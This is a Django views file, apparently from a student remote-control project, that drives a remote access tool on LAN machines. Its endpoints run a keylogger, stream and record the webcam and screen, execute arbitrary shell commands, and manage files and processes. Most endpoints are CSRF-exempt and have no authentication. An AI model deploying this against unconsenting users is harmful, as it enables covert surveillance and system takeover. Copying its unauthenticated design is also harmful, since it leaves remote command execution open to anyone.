"""
Remote Control Views - Django API Endpoints với Persistent Connection
Sử dụng Session-based connection management và UDP Discovery
"""
import json
import logging
import os
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse, HttpResponse, Http404, FileResponse
from django.views.decorators.http import require_http_methods
from django.views.decorators.csrf import csrf_exempt
from django.core.files.base import ContentFile

# Import Models
from .models import WebcamRecording, ScreenRecording

# Import Persistent Client và UDP Discovery
from .socket_client_persistent import PersistentRemoteClient
from .udp_discovery import UDPDiscoveryClient

logger = logging.getLogger(__name__)

# ==================== HELPERS ====================

def _get_client(request):
    """
    Helper: Lấy PersistentRemoteClient từ session
    """
    session_id = request.session.session_key
    if not session_id:
        request.session.create()
        session_id = request.session.session_key
    
    server_ip = request.session.get('target_server_ip')
    
    if not server_ip:
        # Không log warning ở đây để tránh spam log khi user chưa connect
        return None
    
    return PersistentRemoteClient.get_or_create(
        session_id=session_id,
        host=server_ip,
        port=5656,
        timeout=60
    )

def _format_duration(seconds):
    """Helper: Format giây sang HH:MM:SS"""
    try:
        if not seconds: return "00:00:00"
        seconds = int(float(seconds))
        m, s = divmod(seconds, 60)
        h, m = divmod(m, 60)
        return "{:02d}:{:02d}:{:02d}".format(h, m, s)
    except:
        return "00:00:00"

def _cleanup_missing_recordings():
    """Helper: Xóa record trong DB nếu file thực tế không tồn tại"""
    try:
        for ModelClass in [WebcamRecording, ScreenRecording]:
            for rec in ModelClass.objects.all():
                if not rec.file_path or not os.path.exists(rec.file_path.path):
                    rec.delete()
    except Exception as e:
        logger.warning(f"Cleanup warning: {e}")

def _auto_save_recording(request, client, mode='webcam'):
    """
    Helper: Tự động lưu file khi ngắt kết nối
    mode: 'webcam' hoặc 'screen'
    """
    try:
        # 1. Kiểm tra trạng thái và stop
        if mode == 'webcam':
            status = client.webcam_status()
            if not status.get('recording'): return
            res = client.webcam_stop_recording()
            prefix = ""
            ModelClass = WebcamRecording
        else: # screen
            status = client.screen_status()
            if not status.get('recording'): return
            res = client.screen_stop_recording()
            prefix = "SCREEN_"
            ModelClass = ScreenRecording

        # 2. Lưu file nếu stop thành công
        if res.get('success'):
            raw_name = res.get('filename', f'{mode}_autosave.avi')
            final_name = prefix + raw_name if prefix else raw_name
            
            rec = ModelClass(
                server_ip=request.session.get('target_server_ip', 'unknown'),
                filename=final_name,
                file_size=res.get('file_size'),
                duration=res.get('duration', 0)
            )
            rec.file_path.save(final_name, ContentFile(res.get('video_data')), save=True)
            logger.info(f"Auto-saved {mode}: {final_name}")

    except Exception as e:
        logger.error(f"Error auto-saving {mode}: {e}")
    finally:
        # Luôn đảm bảo tắt luồng
        try:
            if mode == 'webcam': client.webcam_off()
            else: client.screen_stop_stream()
        except: pass

# ==================== PAGE VIEWS ====================

def index(request):
    """Trang chủ Tổng quan"""
    return render(request, 'remote_control/home.html')

def home_page(request):
    template = 'remote_control/partials/home_partial.html' if request.headers.get("HX-Request") else 'remote_control/home.html'
    return render(request, template)

# Gom nhóm các page view đơn giản
def simple_page_view(request, page_name):
    template_name = f'remote_control/{page_name}.html'
    if request.headers.get("HX-Request"):
        template_name = f'remote_control/partials/{page_name}_partial.html'
    return render(request, template_name)

def applications_page(request): return simple_page_view(request, 'applications')
def processes_page(request):    return simple_page_view(request, 'processes')
def screenshot_page(request):   return simple_page_view(request, 'screenshot')
def keylogger_page(request):    return simple_page_view(request, 'keylogger')
def webcam_page(request):       return simple_page_view(request, 'webcam')
def screen_page(request):       return simple_page_view(request, 'screen')
def power_page(request):        return simple_page_view(request, 'power')
def shell_page(request):        return simple_page_view(request, 'shell')

def file_manager_page(request):
    """Trang File Manager"""
    server_ip = request.session.get('target_server_ip')
    client = _get_client(request)
    is_connected = bool(server_ip and client and client.connected)
    
    context = {'is_connected': is_connected}
    template = 'remote_control/partials/file_manager_partial.html' if request.headers.get('HX-Request') else 'remote_control/file_manager.html'
    return render(request, template, context)

@require_http_methods(["GET"])
def server_info(request):
    start_time = getattr(PersistentRemoteClient, '_server_start_time', 0)
    return JsonResponse({"start_time": start_time})

# ==================== CONNECTION APIs ====================

@require_http_methods(["GET"])
def discover_servers(request):
    """API: Tìm kiếm servers trong LAN qua UDP"""
    try:
        discovery_client = UDPDiscoveryClient(timeout=3.0)
        result = discovery_client.discover_with_details()
        return JsonResponse(result)
    except Exception as e:
        logger.error(f"Discovery error: {str(e)}")
        return JsonResponse({"success": False, "servers": [], "message": str(e)}, status=500)

@csrf_exempt
@require_http_methods(["POST"])
def connect_server(request):
    """API: Tạo persistent connection"""
    try:
        data = json.loads(request.body)
        server_ip = data.get('server_ip')
        
        if not server_ip:
            return JsonResponse({"success": False, "message": "Server IP is required"}, status=400)
        
        request.session['target_server_ip'] = server_ip
        client = _get_client(request)
        
        if client and client.connected:
            client.shell_reset() # Reset CMD state
            return JsonResponse({
                "success": True, 
                "message": f"Connected to {server_ip}", 
                "server_ip": server_ip
            })
        else:
            return JsonResponse({"success": False, "message": "Failed to connect to server"}, status=500)
    
    except Exception as e:
        logger.error(f"Connect error: {str(e)}")
        return JsonResponse({"success": False, "message": str(e)}, status=500)

@csrf_exempt
@require_http_methods(["POST"])
def disconnect_server(request):
    """API: Ngắt connection và auto-save recordings"""
    try:
        client = _get_client(request)
        if client and client.connected:
            # Helper xử lý auto save và tắt thiết bị
            _auto_save_recording(request, client, mode='webcam')
            _auto_save_recording(request, client, mode='screen')
            
            try:
                client.shell_reset()
            except: pass

        # Clean session
        session_id = request.session.session_key
        if session_id:
            PersistentRemoteClient.disconnect_session(session_id)
        
        if 'target_server_ip' in request.session:
            del request.session['target_server_ip']
        
        return JsonResponse({"success": True, "message": "Disconnected and saved all recordings"})
    
    except Exception as e:
        logger.error(f"Disconnect error: {str(e)}")
        return JsonResponse({"success": False, "message": str(e)}, status=500)

# ==================== SYSTEM CONTROL APIs ====================

@require_http_methods(["GET"])
def get_server_stats(request):
    client = _get_client(request)
    if not client or not client.connected:
        return JsonResponse({"status": "disconnected", "message": "Client not connected"})
        
    result = client.get_system_stats()
    # Check lỗi pipe gãy
    if result.get("status") == "error" and "Broken pipe" in str(result.get("message")):
         return JsonResponse({"status": "disconnected"})
    return JsonResponse(result)

@csrf_exempt
@require_http_methods(["POST"])
def power_action_specific(request, action_type):
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "disconnected", "message": "Not connected"}, status=200)
    
    cmd_map = {"shutdown": "SHUTDOWN", "restart": "RESTART"}
    cmd = cmd_map.get(action_type.lower())
    
    if not cmd:
        return JsonResponse({"status": "error", "message": f"Invalid action: {action_type}"}, status=400)
    
    try:
        result = client.send_command(cmd)
        if result.get("status") == "success":
            session_id = request.session.session_key
            PersistentRemoteClient.disconnect_session(session_id)
            if 'target_server_ip' in request.session:
                del request.session['target_server_ip']
            
            result["disconnected"] = True 
            result["message"] += " & Disconnected."
        return JsonResponse(result)
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)}, status=500)

# ==================== PROCESS & APP APIs ====================

@require_http_methods(["GET"])
def get_processes(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("PROCESS", "XEM"))

@csrf_exempt
@require_http_methods(["POST"])
def kill_process(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    try:
        pid = json.loads(request.body).get('id')
        return JsonResponse(client.send_command("PROCESS", "KILL", pid))
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)})

@csrf_exempt
@require_http_methods(["POST"])
def start_process(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    try:
        name = json.loads(request.body).get('name')
        return JsonResponse(client.send_command("PROCESS", "START", name))
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)})

@require_http_methods(["GET"])
def get_apps(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("APPLICATION", "XEM"))

@csrf_exempt
@require_http_methods(["POST"])
def kill_app(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    try:
        app_id = json.loads(request.body).get('id')
        return JsonResponse(client.send_command("APPLICATION", "KILL", app_id))
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)})

# ==================== KEYLOGGER & SCREENSHOT APIs ====================

@require_http_methods(["GET"])
def get_keylog_status(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("KEYLOG", "STATUS"))

@require_http_methods(["GET"])
def get_keylog(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("KEYLOG", "PRINT"))

@csrf_exempt
@require_http_methods(["POST"])
def hook_keylog(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    try:
        action = json.loads(request.body).get('action') # HOOK/UNHOOK
        return JsonResponse(client.send_command("KEYLOG", action))
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)})

@csrf_exempt
@require_http_methods(["POST"])
def clear_keylog(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("KEYLOG", "CLEAR"))

@require_http_methods(["GET"])
def take_screenshot(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("TAKEPIC"))

# ==================== CMD SHELL APIs ====================

@csrf_exempt
@require_http_methods(["POST"])
def execute_shell_command(request):
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "disconnected", "message": "Not connected"}, status=200)
    try:
        cmd = json.loads(request.body).get('command')
        if not cmd: return JsonResponse({"status": "error", "message": "Command empty"})
        return JsonResponse(client.send_command("CMD", "EXEC", cmd))
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)}, status=500)

# ==================== WEBCAM APIs ====================

@csrf_exempt
@require_http_methods(["POST"])
def webcam_on(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    return JsonResponse(client.webcam_on())

@csrf_exempt
@require_http_methods(["POST"])
def webcam_off(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    return JsonResponse(client.webcam_off())

@require_http_methods(["GET"])
def webcam_stream(request):
    if not request.session.get('target_server_ip'): return HttpResponse(status=204)
    client = _get_client(request)
    if not client: return HttpResponse("Not connected", status=400)
    
    try:
        frame = client.webcam_get_frame()
        return HttpResponse(frame, content_type='image/jpeg') if frame else HttpResponse(status=204)
    except:
        return HttpResponse(status=500)

@csrf_exempt
@require_http_methods(["POST"])
def webcam_start_recording(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    return JsonResponse(client.webcam_start_recording())

@csrf_exempt
@require_http_methods(["POST"])
def webcam_stop_recording(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    try:
        result = client.webcam_stop_recording()
        if not result.get('success'): return JsonResponse(result)
        
        filename = result.get('filename', 'unknown.avi')
        video_data = result.get('video_data', b'')
        
        if not video_data: return JsonResponse({"success": False, "message": "No data received"})

        rec = WebcamRecording(
            server_ip=request.session.get('target_server_ip', 'unknown'),
            filename=filename,
            file_size=result.get('file_size', 0),
            duration=result.get('duration', 0)
        )
        rec.file_path.save(filename, ContentFile(video_data), save=True)
        
        return JsonResponse({
            "success": True, "message": "Saved",
            "recording_id": rec.id,
            "filename": filename,
            "file_size": rec.get_file_size_display()
        })
    except Exception as e:
        logger.error(f"Webcam save error: {e}")
        return JsonResponse({"success": False, "message": str(e)}, status=500)

@require_http_methods(["GET"])
def webcam_status(request):
    client = _get_client(request)
    if not client: return JsonResponse({"on": False, "rec": False})
    return JsonResponse(client.webcam_status())

@require_http_methods(["GET"])
def webcam_list(request):
    _cleanup_missing_recordings()
    server_ip = request.session.get('target_server_ip')
    if not server_ip: return JsonResponse({"success": True, "recordings": []})
    
    recordings = WebcamRecording.objects.filter(server_ip=server_ip).order_by('-recorded_at')
    data = [{
        "id": r.id,
        "filename": r.filename,
        "file_url": f"/remote/api/download/webcam/{r.id}/",
        "recorded_at": r.recorded_at.strftime("%Y-%m-%d %H:%M:%S"),
        "file_size": r.get_file_size_display(),
        "duration": _format_duration(r.duration)
    } for r in recordings]
    
    return JsonResponse({"success": True, "recordings": data})

@csrf_exempt
@require_http_methods(["DELETE"])
def webcam_delete(request, recording_id):
    try:
        rec = WebcamRecording.objects.get(id=recording_id)
        if rec.file_path: rec.file_path.delete()
        rec.delete()
        return JsonResponse({"success": True, "message": "Deleted"})
    except WebcamRecording.DoesNotExist:
        return JsonResponse({"success": False, "message": "Not found"}, status=404)
    except Exception as e:
        return JsonResponse({"success": False, "message": str(e)}, status=500)

# ==================== SCREEN RECORDING APIs ====================

@require_http_methods(["GET"])
def screen_list(request):
    _cleanup_missing_recordings()
    server_ip = request.session.get('target_server_ip')
    if not server_ip: return JsonResponse({"success": True, "recordings": []})
    
    recordings = ScreenRecording.objects.filter(server_ip=server_ip).order_by('-recorded_at')
    data = [{
        "id": r.id,
        "filename": r.filename,
        "file_url": f"/remote/api/download/screen/{r.id}/",
        "recorded_at": r.recorded_at.strftime("%Y-%m-%d %H:%M:%S"),
        "file_size": r.get_file_size_display(),
        "duration": _format_duration(r.duration)
    } for r in recordings]
    
    return JsonResponse({"success": True, "recordings": data})

@csrf_exempt
@require_http_methods(["POST"])
def screen_stream_on(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    return JsonResponse(client.screen_start_stream())

@csrf_exempt
@require_http_methods(["POST"])
def screen_stream_off(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    return JsonResponse(client.screen_stop_stream())

@require_http_methods(["GET"])
def screen_stream_frame(request):
    client = _get_client(request)
    if not client: return HttpResponse(status=204)
    frame = client.screen_get_frame()
    return HttpResponse(frame, content_type='image/jpeg') if frame else HttpResponse(status=204)

@csrf_exempt
@require_http_methods(["POST"])
def screen_start_rec(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    return JsonResponse(client.screen_start_recording())

@csrf_exempt
@require_http_methods(["POST"])
def screen_stop_rec(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    try:
        result = client.screen_stop_recording()
        if not result.get('success'): return JsonResponse(result)
        
        filename = "SCREEN_" + result.get('filename', 'unknown.avi')
        
        rec = ScreenRecording(
            server_ip=request.session.get('target_server_ip', 'unknown'),
            filename=filename,
            file_size=result.get('file_size'),
            duration=result.get('duration', 0)
        )
        rec.file_path.save(filename, ContentFile(result.get('video_data')), save=True)
        
        return JsonResponse({
            "success": True, "message": "Saved",
            "filename": filename,
            "file_size": rec.get_file_size_display(),
            "duration": result.get('duration')
        })
    except Exception as e:
        return JsonResponse({"success": False, "message": str(e)}, status=500)

@require_http_methods(["GET"])
def screen_get_status(request):
    client = _get_client(request)
    if not client: return JsonResponse({"on": False, "rec": False})
    return JsonResponse(client.screen_status())

@csrf_exempt
@require_http_methods(["DELETE"])
def screen_delete(request, recording_id):
    try:
        rec = ScreenRecording.objects.get(id=recording_id)
        if rec.file_path: rec.file_path.delete()
        rec.delete()
        return JsonResponse({"success": True, "message": "Deleted"})
    except ScreenRecording.DoesNotExist:
        return JsonResponse({"success": False, "message": "Not found"}, status=404)

# ==================== COMMON DOWNLOAD API ====================

@require_http_methods(["GET"])
def download_recording(request, rec_type, rec_id):
    """API: Tải file an toàn (Check Server IP)"""
    server_ip = request.session.get('target_server_ip')
    if not server_ip: raise Http404("Access Denied")

    if rec_type == 'webcam': ModelClass = WebcamRecording
    elif rec_type == 'screen': ModelClass = ScreenRecording
    else: raise Http404("Invalid type")

    rec = get_object_or_404(ModelClass, id=rec_id, server_ip=server_ip)
    
    if not rec.file_path or not os.path.exists(rec.file_path.path):
        raise Http404("File not found on server")

    try:
        response = FileResponse(open(rec.file_path.path, 'rb'), as_attachment=True)
        response['Content-Disposition'] = f'attachment; filename="{rec.filename}"'
        return response
    except Exception as e:
        raise Http404(f"Read error: {e}")

# ==================== FILE MANAGER APIs ====================

@csrf_exempt
def file_get_drives(request):
    client = _get_client(request)
    if not client or not client.connected: 
        return JsonResponse({"success": False, "message": "Access Denied"}, status=403)
    return JsonResponse(client.file_get_drives())

@csrf_exempt
@require_http_methods(["POST"])
def file_get_dir(request):
    client = _get_client(request)
    if not client or not client.connected: 
        return JsonResponse({"success": False, "message": "Access Denied"}, status=403)
    path = json.loads(request.body).get('path', '')
    return JsonResponse(client.file_get_directory(path))

@csrf_exempt
@require_http_methods(["POST"])
def file_delete(request):
    client = _get_client(request)
    if not client or not client.connected: 
        return JsonResponse({"success": False, "message": "Access Denied"}, status=403)
    path = json.loads(request.body).get('path')
    return JsonResponse(client.file_delete_item(path))

@csrf_exempt
@require_http_methods(["POST"])
def file_download(request):
    client = _get_client(request)
    if not client or not client.connected: 
        return JsonResponse({"success": False, "message": "Access Denied"}, status=403)
    
    path = json.loads(request.body).get('path')
    result = client.file_download(path)
    
    if result.get('success'):
        response = HttpResponse(result['data'], content_type='application/octet-stream')
        response['Content-Disposition'] = f'attachment; filename="{result["filename"]}"'
        return response
    return JsonResponse(result, status=404)